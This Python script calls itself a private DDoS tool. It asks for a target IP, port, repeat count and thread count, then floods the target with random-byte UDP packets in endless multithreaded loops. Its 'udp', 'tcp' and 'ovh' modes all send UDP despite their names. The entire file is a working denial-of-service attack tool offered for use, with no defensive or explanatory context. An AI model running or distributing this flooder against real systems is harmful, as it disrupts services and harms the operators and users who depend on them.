import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

os.system("clear")
print("З А Г Р У З К А....")
time.sleep(1.5)
os.system("clear")

def  type(s):

        for c in s  +  '\n' :

              sys.stdout.write( c )

              sys.stdout.flush( )

              time.sleep(1.035)

type("""Tools DDos Pribadi ADIT""")
choice = str(input("$ methods udp/tcp/ovh : => "))
ip = str(input("$ IP : => "))
port = int(input("$ Port : => "))
times = int(input("$ Times : => "))
threads = int(input("$ Threads : => "))

def udp():
	data = random._urandom(818)
	i = random.choice(("[+]","[!]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" DDoS ADIT Has Sent")
		except:
			print("ERROR Command")
			
def tcp():
	data = random._urandom(102404)
	i = random.choice(("[+]","[!]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" DDoS ADIT Has Sent")
		except:
			print("ERROR Command")
			
def ovh():
	data = random._urandom(56000)
	i = random.choice(("[+]","[!]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" DDoS ADIT Has Sent")
		except:
			print("ERROR Command")

for y in range(threads):
	if choice == 'udp':
		th = threading.Thread(target = udp)
		th.start()
	elif choice == 'tcp':
		th = threading.Thread(target = tcp)
		th.start()
	elif choice == 'ovh':
		th = threading.Thread(target = ovh)
		th.start()
